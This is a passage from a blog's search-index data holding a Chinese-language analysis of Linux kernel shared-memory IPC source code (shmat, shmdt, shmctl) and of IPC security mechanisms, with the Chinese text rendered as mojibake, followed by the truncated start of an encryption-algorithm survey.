ipc_namespace *ns; struct shm_file_data *sfd; int f_flags; unsigned long populate = 0; err = -EINVAL; if (shmid \u0026lt; 0) goto out; if (addr) { if (addr \u0026amp; (shmlba - 1)) { if (shmflg \u0026amp; SHM_RND) { addr \u0026amp;= ~(shmlba - 1); /* round down */ /* * Ensure that the round-down is non-nil * when remapping. This can happen for * cases when addr \u0026lt; shmlba. */ if (!addr \u0026amp;\u0026amp; (shmflg \u0026amp; SHM_REMAP)) goto out; } else #ifndef __ARCH_FORCE_SHMLBA if (addr \u0026amp; ~PAGE_MASK) #endif goto out; } flags |= MAP_FIXED; } else if ((shmflg \u0026amp; SHM_REMAP)) goto out; if (shmflg \u0026amp; SHM_RDONLY) { prot = PROT_READ; acc_mode = S_IRUGO; f_flags = O_RDONLY; } else { prot = PROT_READ | PROT_WRITE; acc_mode = S_IRUGO | S_IWUGO; f_flags = O_RDWR; } if (shmflg \u0026amp; SHM_EXEC) { prot |= PROT_EXEC; acc_mode |= S_IXUGO; } /* * We cannot rely on the fs check since SYSV IPC does have an * additional creator id... */ ns = current-\u0026gt;nsproxy-\u0026gt;ipc_ns; rcu_read_lock(); shp = shm_obtain_object_check(ns, shmid); if (IS_ERR(shp)) { err = PTR_ERR(shp); goto out_unlock; } err = -EACCES; if (ipcperms(ns, \u0026amp;shp-\u0026gt;shm_perm, acc_mode)) goto out_unlock; err = security_shm_shmat(\u0026amp;shp-\u0026gt;shm_perm, shmaddr, shmflg); if (err) goto out_unlock; ipc_lock_object(\u0026amp;shp-\u0026gt;shm_perm); /* check if shm_destroy() is tearing down shp */ if (!ipc_valid_object(\u0026amp;shp-\u0026gt;shm_perm)) { ipc_unlock_object(\u0026amp;shp-\u0026gt;shm_perm); err = -EIDRM; goto out_unlock; } /* * We need to take a reference to the real shm file to prevent the * pointer from becoming stale in cases where the lifetime of the outer * file extends beyond that of the shm segment. It\u0026#39;s not usually * possible, but it can happen during remap_file_pages() emulation as * that unmaps the memory, then does -\u0026gt;mmap() via file reference only. * We\u0026#39;ll deny the -\u0026gt;mmap() if the shm segment was since removed, but to * detect shm ID reuse we need to compare the file pointers. */ base = get_file(shp-\u0026gt;shm_file); shp-\u0026gt;shm_nattch++; size = i_size_read(file_inode(base)); ipc_unlock_object(\u0026amp;shp-\u0026gt;shm_perm); rcu_read_unlock(); err = -ENOMEM; sfd = kzalloc(sizeof(*sfd), GFP_KERNEL); if (!sfd) { fput(base); goto out_nattch; } file = alloc_file_clone(base, f_flags, is_file_hugepages(base) ? \u0026amp;shm_file_operations_huge : \u0026amp;shm_file_operations); err = PTR_ERR(file); if (IS_ERR(file)) { kfree(sfd); fput(base); goto out_nattch; } sfd-\u0026gt;id = shp-\u0026gt;shm_perm.id; sfd-\u0026gt;ns = get_ipc_ns(ns); sfd-\u0026gt;file = base; sfd-\u0026gt;vm_ops = NULL; file-\u0026gt;private_data = sfd; err = security_mmap_file(file, prot, flags); if (err) goto out_fput; if (mmap_write_lock_killable(current-\u0026gt;mm)) { err = -EINTR; goto out_fput; } if (addr \u0026amp;\u0026amp; !(shmflg \u0026amp; SHM_REMAP)) { err = -EINVAL; if (addr + size \u0026lt; addr) goto invalid; if (find_vma_intersection(current-\u0026gt;mm, addr, addr + size)) goto invalid; } addr = do_mmap(file, addr, size, prot, flags, 0, 0, \u0026amp;populate, NULL); *raddr = addr; err = 0; if (IS_ERR_VALUE(addr)) err = (long)addr; invalid: mmap_write_unlock(current-\u0026gt;mm); if (populate) mm_populate(addr, populate); out_fput: fput(file); out_nattch: down_write(\u0026amp;shm_ids(ns).rwsem); shp = shm_lock(ns, shmid); shp-\u0026gt;shm_nattch--; if (shm_may_destroy(shp)) shm_destroy(ns, shp); else shm_unlock(shp); up_write(\u0026amp;shm_ids(ns).rwsem); return err; out_unlock: rcu_read_unlock(); out: return err; } 3ã€å…±äº«å†…å­˜çš„è§£é™¤å…³è”\nå½“è¿›ç¨‹ä¸éœ€è¦å†æ“ä½œå…±äº«å†…å­˜ï¼Œå¯ä»¥è®©è¿›ç¨‹å’Œå…±äº«å†…å­˜è§£é™¤å…³è”ï¼Œå¦å¤–å¦‚æœæ²¡æœ‰æ‰§è¡Œè¯¥æ“ä½œï¼Œè¿›ç¨‹é€€å‡ºä¹‹åï¼Œç»“æŸçš„è¿›ç¨‹å’Œå…±äº«å†…å­˜çš„å…³è”ä¹Ÿå°±è‡ªåŠ¨è§£é™¤äº†ã€‚\nè¿™ä¸ªå‡½æ•°å…ˆæ‰¾åˆ°ä¼ å…¥çš„shmaddrå¯¹åº”çš„è™šæ‹Ÿå†…å­˜æ•°æ®ç»“æ„vmaï¼Œæ£€æŸ¥å®ƒçš„åœ°å€æ˜¯ä¸æ˜¯æ­£ç¡®çš„ï¼Œç„¶åè°ƒç”¨do_vma_munmap()å‡½æ•°æ–­å¼€å¯¹å…±äº«å†…å­˜çš„è¿æ¥ã€‚æ³¨æ„æ­¤æ“ä½œå¹¶ä¸ä¼šé”€æ¯å…±äº«å†…å­˜ï¼Œå³ä½¿æ²¡æœ‰è¿›ç¨‹è¿æ¥åˆ°å®ƒä¹Ÿä¸ä¼šï¼Œåªæœ‰æ‰‹åŠ¨è°ƒç”¨shmctl(id, IPC_RMID, NULL)æ‰èƒ½é”€æ¯ã€‚\nCOMPAT_SYSCALL_DEFINE3(shmat, int, shmid, compat_uptr_t, shmaddr, int, shmflg) { unsigned long ret; long err; err = do_shmat(shmid, compat_ptr(shmaddr), shmflg, \u0026amp;ret, COMPAT_SHMLBA); if (err) return err; force_successful_syscall_return(); return (long)ret; } #endif /* * detach and kill segment if marked destroyed. * The work is done in shm_close. */ long ksys_shmdt(char __user *shmaddr) { struct mm_struct *mm = current-\u0026gt;mm; struct vm_area_struct *vma; unsigned long addr = (unsigned long)shmaddr; int retval = -EINVAL; #ifdef CONFIG_MMU loff_t size = 0; struct file *file; VMA_ITERATOR(vmi, mm, addr); #endif if (addr \u0026amp; ~PAGE_MASK) return retval; if (mmap_write_lock_killable(mm)) return -EINTR; /* * This function tries to be smart and unmap shm segments that * were modified by partial mlock or munmap calls: * - It first determines the size of the shm segment that should be * unmapped: It searches for a vma that is backed by shm and that * started at address shmaddr. It records it\u0026#39;s size and then unmaps * it. * - Then it unmaps all shm vmas that started at shmaddr and that * are within the initially determined size and that are from the * same shm segment from which we determined the size. * Errors from do_munmap are ignored: the function only fails if * it\u0026#39;s called with invalid parameters or if it\u0026#39;s called to unmap * a part of a vma. Both calls in this function are for full vmas, * the parameters are directly copied from the vma itself and always * valid - therefore do_munmap cannot fail. (famous last words?) */ /* * If it had been mremap()\u0026#39;d, the starting address would not * match the usual checks anyway. So assume all vma\u0026#39;s are * above the starting address given. */ #ifdef CONFIG_MMU for_each_vma(vmi, vma) { /* * Check if the starting address would match, i.e. it\u0026#39;s * a fragment created by mprotect() and/or munmap(), or it * otherwise it starts at this address with no hassles. */ if ((vma-\u0026gt;vm_ops == \u0026amp;shm_vm_ops) \u0026amp;\u0026amp; (vma-\u0026gt;vm_start - addr)/PAGE_SIZE == vma-\u0026gt;vm_pgoff) { /* * Record the file of the shm segment being * unmapped. With mremap(), someone could place * page from another segment but with equal offsets * in the range we are unmapping. */ file = vma-\u0026gt;vm_file; size = i_size_read(file_inode(vma-\u0026gt;vm_file)); do_vma_munmap(\u0026amp;vmi, vma, vma-\u0026gt;vm_start, vma-\u0026gt;vm_end, NULL, false); /* * We discovered the size of the shm segment, so * break out of here and fall through to the next * loop that uses the size information to stop * searching for matching vma\u0026#39;s. */ retval = 0; vma = vma_next(\u0026amp;vmi); break; } } /* * We need look no further than the maximum address a fragment * could possibly have landed at. Also cast things to loff_t to * prevent overflows and make comparisons vs. equal-width types. */ size = PAGE_ALIGN(size); while (vma \u0026amp;\u0026amp; (loff_t)(vma-\u0026gt;vm_end - addr) \u0026lt;= size) { /* finding a matching vma now does not alter retval */ if ((vma-\u0026gt;vm_ops == \u0026amp;shm_vm_ops) \u0026amp;\u0026amp; ((vma-\u0026gt;vm_start - addr)/PAGE_SIZE == vma-\u0026gt;vm_pgoff) \u0026amp;\u0026amp; (vma-\u0026gt;vm_file == file)) { do_vma_munmap(\u0026amp;vmi, vma, vma-\u0026gt;vm_start, vma-\u0026gt;vm_end, NULL, false); } vma = vma_next(\u0026amp;vmi); } #else\t/* CONFIG_MMU */ vma = vma_lookup(mm, addr); /* under NOMMU conditions, the exact address to be destroyed must be * given */ if (vma \u0026amp;\u0026amp; vma-\u0026gt;vm_start == addr \u0026amp;\u0026amp; vma-\u0026gt;vm_ops == \u0026amp;shm_vm_ops) { do_munmap(mm, vma-\u0026gt;vm_start, vma-\u0026gt;vm_end - vma-\u0026gt;vm_start, NULL); retval = 0; } #endif mmap_write_unlock(mm); return retval; } å‚æ•°ï¼šshmat () å‡½æ•°çš„è¿”å›å€¼ï¼Œå…±äº«å†…å­˜çš„èµ·å§‹åœ°å€\nè¿”å›å€¼ï¼šå…³è”è§£é™¤æˆåŠŸè¿”å› 0ï¼Œå¤±è´¥è¿”å› - 1\n4ã€åˆ é™¤å…±äº«å†…å­˜\nshmctl () å‡½æ•°æ˜¯ä¸€ä¸ªå¤šåŠŸèƒ½å‡½æ•°ï¼Œå¯ä»¥è®¾ç½®ã€è·å–å…±äº«å†…å­˜çš„çŠ¶æ€ä¹Ÿå¯ä»¥å°†å…±äº«å†…å­˜æ ‡è®°ä¸ºåˆ é™¤çŠ¶æ€ã€‚å½“å…±äº«å†…å­˜è¢«æ ‡è®°ä¸ºåˆ é™¤çŠ¶æ€ä¹‹åï¼Œå¹¶ä¸ä¼šé©¬ä¸Šè¢«åˆ é™¤ï¼Œç›´åˆ°æ‰€æœ‰çš„è¿›ç¨‹å…¨éƒ¨å’Œå…±äº«å†…å­˜è§£é™¤å…³è”ï¼Œå…±äº«å†…å­˜æ‰ä¼šè¢«åˆ é™¤ã€‚å› ä¸ºé€šè¿‡ shmctl () å‡½æ•°åªæ˜¯èƒ½å¤Ÿæ ‡è®°åˆ é™¤å…±äº«å†…å­˜ï¼Œæ‰€ä»¥åœ¨ç¨‹åºä¸­å¤šæ¬¡è°ƒç”¨è¯¥æ“ä½œæ˜¯æ²¡æœ‰å…³ç³»çš„ã€‚\n// å…±äº«å†…å­˜æ§åˆ¶å‡½æ•° int shmctl(int shmid, int cmd, struct shmid_ds *buf); // å‚æ•° struct shmid_ds ç»“æ„ä½“åŸå‹ struct shmid_ds { struct ipc_perm shm_perm; /* Ownership and permissions */ size_t shm_segsz; /* Size of segment (bytes) */ time_t shm_atime; /* Last attach time */ time_t shm_dtime; /* Last detach time */ time_t shm_ctime; /* Last change time */ pid_t shm_cpid; /* PID of creator */ pid_t shm_lpid; /* PID of last shmat(2)/shmdt(2) */ // å¼•ç”¨è®¡æ•°, å¤šå°‘ä¸ªè¿›ç¨‹å’Œå…±äº«å†…å­˜è¿›è¡Œäº†å…³è” shmatt_t shm_nattch; /* è®°å½•äº†æœ‰å¤šå°‘ä¸ªè¿›ç¨‹å’Œå½“å‰å…±äº«å†…å­˜è¿›è¡Œäº†ç®¡è” */ ... }; å‚æ•°:\nshmid: è¦æ“ä½œçš„å…±äº«å†…å­˜çš„ ID, æ˜¯ shmget () å‡½æ•°çš„è¿”å›å€¼\ncmd: è¦åšçš„æ“ä½œï¼Œæ¯”å¦‚\nIPC_STAT: å¾—åˆ°å½“å‰å…±äº«å†…å­˜çš„çŠ¶æ€\nIPC_SET: è®¾ç½®å…±äº«å†…å­˜çš„çŠ¶æ€\nIPC_RMID: æ ‡è®°å…±äº«å†…å­˜è¦è¢«åˆ é™¤äº†\nbuf:\ncmd==IPC_STAT, ä½œä¸ºä¼ å‡ºå‚æ•°ï¼Œä¼šå¾—åˆ°å…±äº«å†…å­˜çš„ç›¸å…³å±æ€§ä¿¡æ¯\ncmd==IPC_SET, ä½œä¸ºä¼ å…¥å‚ï¼Œå°†ç”¨æˆ·çš„è‡ªå®šä¹‰å±æ€§è®¾ç½®åˆ°å…±äº«å†…å­˜ä¸­\ncmd==IPC_RMID, buf å°±æ²¡æ„ä¹‰äº†ï¼Œè¿™æ—¶å€™ buf æŒ‡å®šä¸º NULL å³å¯\nè¿”å›å€¼ï¼šå‡½æ•°è°ƒç”¨æˆåŠŸè¿”å›å€¼å¤§äºç­‰äº 0ï¼Œè°ƒç”¨å¤±è´¥è¿”å› - 1\nç°æœ‰å®‰å…¨ä¿æŠ¤æœºåˆ¶ 1ã€æƒé™æ§åˆ¶\nipc_perm ç»“æ„åŒ…å«äº†ç”¨æˆ· IDã€ç»„ ID ä»¥åŠæƒé™ä½ï¼Œå¯ä»¥ç”¨æ¥æ§åˆ¶è°å¯ä»¥è®¿é—®ã€ä¿®æ”¹æˆ–åˆ é™¤å…±äº«å†…å­˜æ®µã€‚\n2ã€å®‰å…¨æ¨¡å—ï¼ˆLSMï¼‰æ¡†æ¶\nLinux å†…æ ¸ä¸­çš„å®‰å…¨æ¨¡å—ï¼ˆLSMï¼‰æ¡†æ¶æä¾›äº†é’©å­ï¼ˆhookï¼‰ï¼Œå¯ä»¥åœ¨å„ç§ç³»ç»Ÿè°ƒç”¨å’Œå†…æ ¸äº‹ä»¶ä¸­æ’å…¥è‡ªå®šä¹‰çš„å®‰å…¨æ£€æŸ¥ã€‚ï¼ˆåœ¨å†…æ ¸æºç æ ‘/security/security.cä¸­ï¼‰ä¾‹å¦‚ï¼Œshmat ç³»ç»Ÿè°ƒç”¨ä¸­çš„å®‰å…¨æ£€æŸ¥ï¼š\nint security_shmat(struct shmid_kernel *shp, char __user *shmaddr, int shmflg) { return call_int_hook(shmat, 0, shp, shmaddr, shmflg); } 3ã€å‘½åç©ºé—´éš”ç¦»\nä½¿ç”¨å‘½åç©ºé—´ï¼ˆNamespaceï¼‰æ¥éš”ç¦» IPC èµ„æºã€‚æ¯ä¸ª IPC å‘½åç©ºé—´éƒ½æœ‰è‡ªå·±çš„å…±äº«å†…å­˜æ®µã€æ¶ˆæ¯é˜Ÿåˆ—å’Œä¿¡å·é‡é›†åˆã€‚è¿™å¯ä»¥é˜²æ­¢ä¸åŒå®¹å™¨æˆ–è¿›ç¨‹ç»„ä¹‹é—´çš„ IPC èµ„æºå†²çªæˆ–æœªæˆæƒè®¿é—®\n4ã€åœ°å€ç©ºé—´éšæœºåŒ–ï¼ˆASLRï¼‰\n5ã€å†…å­˜ä¿æŠ¤æœºåˆ¶\nä½¿ç”¨å†…å­˜ä¿æŠ¤æœºåˆ¶ï¼Œå¦‚ä¸å¯æ‰§è¡Œï¼ˆnon-executableï¼ŒNXï¼‰ä½å’Œåªè¯»ï¼ˆread-onlyï¼‰ä¿æŠ¤ï¼Œæ¥é˜²æ­¢ä»£ç æ³¨å…¥å’Œæ•°æ®ç¯¡æ”¹ã€‚\nå…¶å®ƒIPCç›¸å…³æºç  1. ç®¡é“ï¼ˆPipeï¼‰å’Œå‘½åç®¡é“ï¼ˆNamed Pipeï¼‰ ç®¡é“å’Œå‘½åç®¡é“çš„å®ç°ä¸»è¦åœ¨fs/pipe.cæ–‡ä»¶ä¸­ã€‚\nåŠŸèƒ½ï¼š\nç®¡é“æä¾›å•å‘çš„æ•°æ®æµï¼Œé€‚ç”¨äºçˆ¶å­è¿›ç¨‹ä¹‹é—´çš„é€šä¿¡ã€‚ å‘½åç®¡é“ï¼ˆFIFOï¼‰ç±»ä¼¼äºç®¡é“ï¼Œä½†å®ƒå­˜åœ¨äºæ–‡ä»¶ç³»ç»Ÿä¸­ï¼Œå¯ä»¥ç”¨äºä»»æ„è¿›ç¨‹é—´çš„é€šä¿¡ã€‚ å®ç°åˆ†æï¼š\nä½¿ç”¨å¾ªç¯ç¼“å†²åŒºå®ç°æ•°æ®çš„è¯»å†™ã€‚ æä¾›äº†åˆ›å»ºã€è¯»ã€å†™ã€å…³é—­ç­‰ç³»ç»Ÿè°ƒç”¨æ¥å£ã€‚ ç›¸å…³æ–‡ä»¶ï¼š\nfs/pipe.c include/linux/pipe_fs_i.h 2. å¥—æ¥å­—ï¼ˆSocketï¼‰ å¥—æ¥å­—æ˜¯ç½‘ç»œé€šä¿¡å’Œè¿›ç¨‹é—´é€šä¿¡çš„é‡è¦æœºåˆ¶ï¼Œå…¶å®ç°æ¶‰åŠå¤šä¸ªæ–‡ä»¶ï¼Œåˆ†å¸ƒåœ¨netç›®å½•ä¸‹ã€‚\nåŠŸèƒ½ï¼š\nå¥—æ¥å­—ç”¨äºé€šè¿‡ç½‘ç»œè¿›è¡Œè¿›ç¨‹é—´é€šä¿¡ï¼Œæ”¯æŒå¤šç§åè®®ï¼ˆå¦‚TCPã€UDPï¼‰ã€‚ ä¹Ÿå¯ä»¥ç”¨äºæœ¬åœ°è¿›ç¨‹é—´é€šä¿¡ï¼ˆUNIXåŸŸå¥—æ¥å­—ï¼‰ã€‚ å®ç°åˆ†æï¼š\nå¥—æ¥å­—çš„æ ¸å¿ƒå®ç°åŒ…æ‹¬åè®®æ—ï¼ˆå¦‚AF_INETã€AF_UNIXï¼‰çš„å…·ä½“å®ç°ã€‚ æä¾›åˆ›å»ºã€ç»‘å®šã€ç›‘å¬ã€æ¥å—ã€å‘é€ã€å…³é—­ç­‰ç³»ç»Ÿè°ƒç”¨æ¥å£ã€‚ ç›¸å…³æ–‡ä»¶ï¼š\nnet/socket.c net/unix/af_unix.c include/net/sock.h 3. ä¿¡å·ï¼ˆSignalï¼‰ ä¿¡å·æ˜¯ç”¨äºå¼‚æ­¥é€šçŸ¥è¿›ç¨‹çš„ä¸€ç§æœºåˆ¶ã€‚\nåŠŸèƒ½ï¼š\nå‘è¿›ç¨‹å‘é€å¼‚æ­¥é€šçŸ¥ï¼Œç”¨äºä¸­æ–­ã€ç»ˆæ­¢ã€å®šæ—¶ç­‰æ“ä½œã€‚ å®ç°åˆ†æï¼š\nå†…æ ¸ç»´æŠ¤ä¿¡å·é˜Ÿåˆ—ï¼Œå½“è¿›ç¨‹å¤„äºé€‚å½“çŠ¶æ€æ—¶ï¼Œå¤„ç†æŒ‚èµ·çš„ä¿¡å·ã€‚ æä¾›ä¿¡å·çš„å‘é€ã€å¤„ç†ã€é˜»å¡ã€å¿½ç•¥ç­‰åŠŸèƒ½ã€‚ ç›¸å…³æ–‡ä»¶ï¼š\nkernel/signal.c include/linux/signal.h IPCå®‰å…¨å¢å¼ºæ–¹æ³• è¦å¯¹è¿›ç¨‹é—´é€šä¿¡ï¼ˆIPCï¼‰æœºåˆ¶è¿›è¡Œå®‰å…¨å¢å¼ºï¼Œéœ€è¦è€ƒè™‘å¤šæ–¹é¢çš„å®‰å…¨å¨èƒï¼Œå¹¶é‡‡å–ç›¸åº”çš„å®‰å…¨æªæ–½ã€‚è¿™äº›æªæ–½å¯ä»¥ä»ä»¥ä¸‹å‡ ä¸ªæ–¹é¢æ¥å®ç°ï¼š\nè®¿é—®æ§åˆ¶å’Œæƒé™ç®¡ç† ä½¿ç”¨æƒé™æ§åˆ¶ï¼šå¯¹å…±äº«å†…å­˜ã€æ¶ˆæ¯é˜Ÿåˆ—ã€ä¿¡å·é‡ç­‰ IPC èµ„æºè¿›è¡Œä¸¥æ ¼çš„æƒé™æ§åˆ¶ï¼Œç¡®ä¿åªæœ‰æˆæƒçš„è¿›ç¨‹å¯ä»¥è®¿é—®ã€‚ ç”¨æˆ·å’Œç»„æƒé™ï¼šé€šè¿‡è®¾ç½® IPC å¯¹è±¡çš„æ‰€æœ‰è€…ã€æ‰€å±ç»„å’Œè®¿é—®æƒé™ï¼ˆè¯»ã€å†™ã€æ‰§è¡Œï¼‰ï¼Œæ§åˆ¶å“ªäº›ç”¨æˆ·å’Œç»„å¯ä»¥è®¿é—®è¿™äº› IPC èµ„æºã€‚ æ•°æ®åŠ å¯† åŠ å¯†ä¼ è¾“çš„æ•°æ®ï¼šå¯¹äºåœ¨ IPC é€šé“ä¸­ä¼ è¾“çš„æ•°æ®ï¼Œä½¿ç”¨åŠ å¯†æŠ€æœ¯ï¼ˆå¦‚ AESã€RSA ç­‰ï¼‰è¿›è¡ŒåŠ å¯†ï¼Œé˜²æ­¢æ•°æ®åœ¨ä¼ è¾“è¿‡ç¨‹ä¸­è¢«çªƒå–æˆ–ç¯¡æ”¹ã€‚ åŠ å¯†å…±äº«å†…å­˜ï¼šåœ¨å†™å…¥å…±äº«å†…å­˜çš„æ•°æ®ä¹‹å‰å¯¹å…¶è¿›è¡ŒåŠ å¯†ï¼Œå¹¶åœ¨è¯»å–æ—¶è§£å¯†ã€‚ æ•°æ®å®Œæ•´æ€§ æ•°æ®æ ¡éªŒï¼šä½¿ç”¨å“ˆå¸Œå‡½æ•°ï¼ˆå¦‚ SHA-256ï¼‰æˆ–æ¶ˆæ¯è®¤è¯ç ï¼ˆMACï¼‰æ¥æ ¡éªŒæ•°æ®çš„å®Œæ•´æ€§ï¼Œç¡®ä¿æ•°æ®åœ¨ä¼ è¾“è¿‡ç¨‹ä¸­æœªè¢«ç¯¡æ”¹ã€‚ æ•°å­—ç­¾åï¼šå¯¹é‡è¦æ•°æ®è¿›è¡Œæ•°å­—ç­¾åï¼ŒéªŒè¯æ•°æ®çš„æ¥æºå’Œå®Œæ•´æ€§ã€‚ é˜²æ­¢èµ„æºæ»¥ç”¨ é™åˆ¶èµ„æºä½¿ç”¨ï¼šè®¾ç½®åˆç†çš„èµ„æºé™åˆ¶ï¼ˆå¦‚å…±äº«å†…å­˜å¤§å°ã€æ¶ˆæ¯é˜Ÿåˆ—é•¿åº¦ã€ä¿¡å·é‡æ•°é‡ï¼‰ï¼Œé˜²æ­¢è¿›ç¨‹æ»¥ç”¨èµ„æºå¯¼è‡´ç³»ç»Ÿå´©æºƒæˆ–æ€§èƒ½ä¸‹é™ã€‚ è¶…æ—¶æœºåˆ¶ï¼šå¯¹ IPC æ“ä½œè®¾ç½®è¶…æ—¶ï¼Œé¿å…è¿›ç¨‹å› ç­‰å¾…èµ„æºè€Œæ— é™é˜»å¡ã€‚ å®¡è®¡å’Œæ—¥å¿—è®°å½• è®°å½•æ“ä½œæ—¥å¿—ï¼šå¯¹æ‰€æœ‰ IPC æ“ä½œè¿›è¡Œæ—¥å¿—è®°å½•ï¼Œè®°å½•æ“ä½œçš„æ—¶é—´ã€ç±»å‹ã€å‘èµ·è¿›ç¨‹å’Œç›®æ ‡è¿›ç¨‹ç­‰ä¿¡æ¯ï¼Œä»¥ä¾¿åœ¨å‘ç”Ÿå®‰å…¨äº‹ä»¶æ—¶è¿›è¡Œè¿½è¸ªå’Œåˆ†æã€‚ å®šæœŸå®¡è®¡ï¼šå®šæœŸæ£€æŸ¥å’Œåˆ†ææ—¥å¿—ï¼Œå‘ç°å¼‚å¸¸æˆ–å¯ç–‘çš„è¡Œä¸ºï¼ŒåŠæ—¶é‡‡å–æªæ–½ã€‚ éš”ç¦»å’Œæ²™ç®± è¿›ç¨‹éš”ç¦»ï¼šä½¿ç”¨å®¹å™¨ï¼ˆå¦‚ Dockerï¼‰æˆ–è™šæ‹ŸåŒ–æŠ€æœ¯ï¼Œå°†è¿›ç¨‹éš”ç¦»åœ¨ä¸åŒçš„æ²™ç®±ä¸­ï¼Œé™åˆ¶å…¶è®¿é—®ç³»ç»Ÿèµ„æºçš„èƒ½åŠ›ã€‚ å®‰å…¨ä¸Šä¸‹æ–‡ï¼šåœ¨å®‰å…¨ä¸Šä¸‹æ–‡ä¸­è¿è¡Œè¿›ç¨‹ï¼Œé™åˆ¶å…¶æƒé™å’Œèµ„æºè®¿é—®èƒ½åŠ›ï¼Œé˜²æ­¢å…¶å¯¹ç³»ç»Ÿé€ æˆç ´åã€‚ å‚è€ƒèµ„æ–™ï¼š http://39.105.211.21:8080/132K3/kernel/src/branch/OLK-6.6-dev-k1/ipc\nlinux/ipc at v6.6 Â· torvalds/linux (github.com)\nã€Linuxç¼–ç¨‹ã€‘è¿›ç¨‹é—´é€šä¿¡ï¼ˆIPCï¼‰ (songlee24.github.io)\nç†è§£ Linux Kernel (11) - è¿›ç¨‹é—´é€šä¿¡ (ffutop.com)\né˜…è¯» Linux å†…æ ¸æºç â€”â€”å…±äº«å†…å­˜ - SegmentFault\nLinux - è¿›ç¨‹é—´é€šä¿¡ï¼ˆIPCï¼‰å…±äº«å†…å­˜(cnblogs.com)\nä¿¡å·é‡(cnblogs.com)\nLinux - è¿›ç¨‹é—´é€šä¿¡ï¼ˆIPCï¼‰æ¶ˆæ¯é˜Ÿåˆ—\n","date":"2024-08-08T00:00:00Z","image":"https://chenyuan1125.github.io/p/%E8%BF%9B%E7%A8%8B%E9%97%B4%E9%80%9A%E4%BF%A1ipc%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%E5%8F%8A%E6%80%BB%E7%BB%93/1_hu5294211469750814667.jpg","permalink":"https://chenyuan1125.github.io/p/%E8%BF%9B%E7%A8%8B%E9%97%B4%E9%80%9A%E4%BF%A1ipc%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%E5%8F%8A%E6%80%BB%E7%BB%93/","title":"è¿›ç¨‹é—´é€šä¿¡ï¼ˆIPCï¼‰æºç åˆ†æåŠæ€»ç»“"},{"content":"åŠ å¯†ç®—æ³•è°ƒç ”æŠ¥å‘Š ç¾å¯†ç®—æ³• å¯¹ç§°åŠ å¯† å¯¹ç§°åŠ å¯†åˆå«åšç§é’¥åŠ å¯†ï¼Œå³ä¿¡æ¯çš„å‘é€æ–¹å’Œæ¥æ”¶æ–¹ä½¿ç”¨åŒä¸€ä¸ªå¯†é’¥å»åŠ å¯†å’Œè§£å¯†æ•°æ®ã€‚å¯¹ç§°åŠ å¯†çš„ç‰¹ç‚¹æ˜¯ç®—æ³•å…¬å¼€ã€åŠ å¯†å’Œè§£å¯†é€Ÿåº¦å¿«ï¼Œé€‚åˆäºå¯¹å¤§æ•°æ®é‡è¿›è¡ŒåŠ å¯†ã€‚\nåŠ å¯†è¿‡ç¨‹å¦‚ä¸‹ï¼šæ˜æ–‡+åŠ å¯†ç®—æ³•+ç§é’¥=\u0026gt;å¯†æ–‡\nè§£å¯†è¿‡ç¨‹å¦‚ä¸‹ï¼šå¯†æ–‡+è§£å¯†ç®—æ³•+ç§é’¥=\u0026gt;æ˜æ–‡\néå¯¹ç§°åŠ å¯† éå¯¹ç§°åŠ å¯†ä¹Ÿå«åšå…¬é’¥åŠ å¯†ã€‚éå¯¹ç§°åŠ å¯†ä¸å¯¹ç§°åŠ å¯†ç›¸æ¯”ï¼Œå…¶å®‰å…¨æ€§æ›´å¥½ã€‚å¯¹ç§°åŠ å¯†çš„é€šä¿¡åŒæ–¹ä½¿ç”¨ç›¸åŒçš„å¯†é’¥ï¼Œå¦‚æœä¸€æ–¹çš„å¯†é’¥é­æ³„éœ²ï¼Œé‚£ä¹ˆæ•´ä¸ªé€šä¿¡å°±ä¼šè¢«ç ´è§£ã€‚è€Œéå¯¹ç§°åŠ å¯†ä½¿ç”¨ä¸€å¯¹å¯†é’¥ï¼Œå³å…¬é’¥å’Œç§é’¥ï¼Œä¸”äºŒè€…æˆå¯¹å‡ºç°ã€‚ç§é’¥è¢«è‡ªå·±ä¿å­˜ï¼Œä¸èƒ½å¯¹å¤–æ³„éœ²ã€‚å…¬é’¥æŒ‡çš„æ˜¯å…¬å…±çš„å¯†é’¥ï¼Œä»»ä½•äººéƒ½å¯ä»¥è·å¾—è¯¥å¯†é’¥ã€‚ç”¨å…¬é’¥æˆ–ç§é’¥ä¸­çš„ä»»ä½•ä¸€ä¸ªè¿›è¡ŒåŠ å¯†ï¼Œç”¨å¦ä¸€ä¸ªè¿›è¡Œè§£å¯†ã€‚\nè¢«å…¬é’¥åŠ å¯†è¿‡çš„å¯†æ–‡åªèƒ½è¢«ç§é’¥è§£å¯†ï¼Œè¿‡ç¨‹å¦‚ä¸‹ï¼š\næ˜æ–‡+åŠ å¯†ç®—æ³•+å…¬é’¥=\u0026gt;å¯†æ–‡ï¼Œå¯†æ–‡+è§£å¯†ç®—æ³•+ç§é’¥=\u0026gt;æ˜æ–‡\nå¸¸è§åŠ å¯†ç®—æ³• MD5ç®—æ³• MD5ç”¨çš„æ˜¯å“ˆå¸Œå‡½æ•°ï¼Œå®ƒçš„å…¸å‹åº”ç”¨æ˜¯å¯¹ä¸€æ®µä¿¡æ¯äº§ç”Ÿä¿¡æ¯æ‘˜è¦ï¼Œä»¥é˜²æ­¢è¢«ç¯¡æ”¹ã€‚ä¸¥æ ¼æ¥è¯´ï¼ŒMD5ä¸æ˜¯ä¸€ç§åŠ å¯†ç®—æ³•è€Œæ˜¯æ‘˜è¦ç®—æ³•ã€‚æ— è®ºæ˜¯å¤šé•¿çš„è¾“å…¥ï¼ŒMD5éƒ½ä¼šè¾“å‡ºé•¿åº¦ä¸º128bitsçš„ä¸€ä¸ªä¸²(é€šå¸¸ç”¨16è¿›åˆ¶è¡¨ç¤ºä¸º32ä¸ªå­—ç¬¦)ã€‚\nSHA1ç®—æ³• SHA1æ˜¯å’ŒMD5ä¸€æ 